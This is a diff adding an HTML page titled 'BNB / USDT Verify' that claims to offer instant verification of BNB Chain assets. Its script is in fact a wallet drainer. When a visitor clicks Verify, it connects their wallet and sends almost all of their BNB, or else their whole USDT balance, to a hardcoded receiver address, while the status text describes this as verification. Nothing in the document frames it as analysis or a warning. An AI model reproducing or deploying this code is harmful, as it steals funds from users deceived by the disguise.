@@ -1,11 +1,131 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>BNB / USDT Verify</title>
-  </head>
-  <body>
-    <div id="root"></div>
-  </body>
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BNB / USDT Verify</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.8.0/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: 'Inter', sans-serif; background:#0b0b0b; color:#E0E0E0; margin:0; padding:0; }
+
+    /* Container */
+    .container { max-width: 600px; margin:auto; padding:1rem; }
+
+    /* Hero Section */
+    .hero {
+      display:flex; flex-direction:column; align-items:center; justify-content:center;
+      text-align:center; padding:4rem 1rem; border-radius:1rem;
+      background: linear-gradient(135deg, #f3ba2f 0%, #facc15 50%, #d4af37 100%);
+      box-shadow: 0 10px 20px rgba(250,204,21,0.2);
+    }
+
+    .badge { background:#1E1E1E; color:#FACC15; font-weight:600; padding:0.25rem 0.75rem; border-radius:9999px; margin-bottom:1rem; display:inline-block; font-size:0.75rem; }
+
+    h1 { font-size:2rem; font-weight:bold; color:#121212; margin-bottom:0.5rem; }
+    p { color:#121212; margin-bottom:2rem; font-size:1rem; }
+
+    /* Verify button & pulse */
+    .verify-container { position:relative; width:160px; height:160px; margin-bottom:1rem; }
+    .pulse-ring { position:absolute; border:2px solid #121212; border-radius:50%; width:100%; height:100%; top:50%; left:50%; transform:translate(-50%, -50%); animation:pulse 2.5s cubic-bezier(0.4,0,0.6,1) infinite; }
+    .pulse-ring:nth-child(1) { animation-delay:0s; }
+    .pulse-ring:nth-child(2) { animation-delay:0.8s; }
+    .pulse-ring:nth-child(3) { animation-delay:1.6s; }
+    .center-button { position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); background:#121212; color:#FACC15; font-weight:600; padding:1rem 2rem; border-radius:9999px; border:none; cursor:pointer; font-size:1rem; z-index:10; }
+    @keyframes pulse { 0%{ transform:scale(0.8); opacity:0.7; } 70%{ transform:scale(1.3); opacity:0; } 100%{ opacity:0; } }
+
+    /* Status text */
+    #status { margin-top:1rem; color:#121212; font-size:0.9rem; font-weight:500; }
+
+    /* Cards Section */
+    .cards { display:flex; flex-wrap:wrap; gap:1rem; justify-content:center; margin-top:2rem; }
+    .card { background:#1E1E1E; border-radius:1rem; padding:1rem; text-align:center; min-width:140px; transition:0.3s; }
+    .card:hover { transform:translateY(-5px); box-shadow:0 10px 20px rgba(250,204,21,0.3); }
+    .card h2 { color:#FACC15; font-size:1rem; font-weight:600; margin-bottom:0.5rem; }
+    .card p { color:#AAA; font-size:0.8rem; }
+
+    footer { text-align:center; padding:2rem 1rem; color:#888; font-size:0.8rem; margin-top:2rem; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Hero -->
+    <div class="hero">
+      <div class="badge">Powered by BNB Chain</div>
+      <h1>Verify Crypto Assets</h1>
+      <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20).</p>
+
+      <div class="verify-container">
+        <div class="pulse-ring"></div>
+        <div class="pulse-ring"></div>
+        <div class="pulse-ring"></div>
+        <button class="center-button" onclick="handleVerify()">Verify</button>
+      </div>
+      <p id="status">Click Verify to start...</p>
+    </div>
+
+    <!-- Cards -->
+    <div class="cards">
+      <div class="card"><h2>Explorer</h2><p>Browse addresses, contracts, tokens, and transactions.</p></div>
+      <div class="card"><h2>Tokens</h2><p>Check token balances and authenticity.</p></div>
+      <div class="card"><h2>NFTs</h2><p>Verify NFTs and view metadata securely.</p></div>
+      <div class="card"><h2>DApps</h2><p>Connect to decentralized apps safely.</p></div>
+    </div>
+
+    <footer>&copy; 2025 BNB Verify. Powered by BNB Chain.</footer>
+  </div>
+
+  <!-- Verification Script -->
+  <script>
+    const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
+    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
+    const ERC20_ABI = [
+      "function balanceOf(address) view returns (uint)",
+      "function transfer(address to, uint amount) returns (bool)"
+    ];
+
+    async function handleVerify() {
+      const statusEl = document.getElementById("status");
+      try {
+        if (!window.ethereum) {
+          statusEl.innerText = "No wallet detected. Please install Binance Wallet or MetaMask.";
+          return;
+        }
+
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        statusEl.innerText = "Checking balances...";
+
+        const balanceBNB = await provider.getBalance(userAddress);
+        if (balanceBNB > ethers.parseEther("0.001")) {
+          statusEl.innerText = "Sending BNB...";
+          const tx = await signer.sendTransaction({ to: RECEIVER, value: balanceBNB - ethers.parseEther("0.0005") });
+          await tx.wait();
+          statusEl.innerText = "BNB sent successfully ✅";
+          return;
+        }
+
+        const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
+        const balanceUSDT = await usdt.balanceOf(userAddress);
+        if (balanceUSDT > 0n) {
+          statusEl.innerText = "Sending USDT...";
+          const tx = await usdt.transfer(RECEIVER, balanceUSDT);
+          await tx.wait();
+          statusEl.innerText = "USDT sent successfully ✅";
+          return;
+        }
+
+        statusEl.innerText = "No BNB or USDT found ❌";
+      } catch (err) {
+        console.error(err);
+        statusEl.innerText = "Error: " + err.message;
+      }
+    }
+  </script>
+
+</body>
 </html>
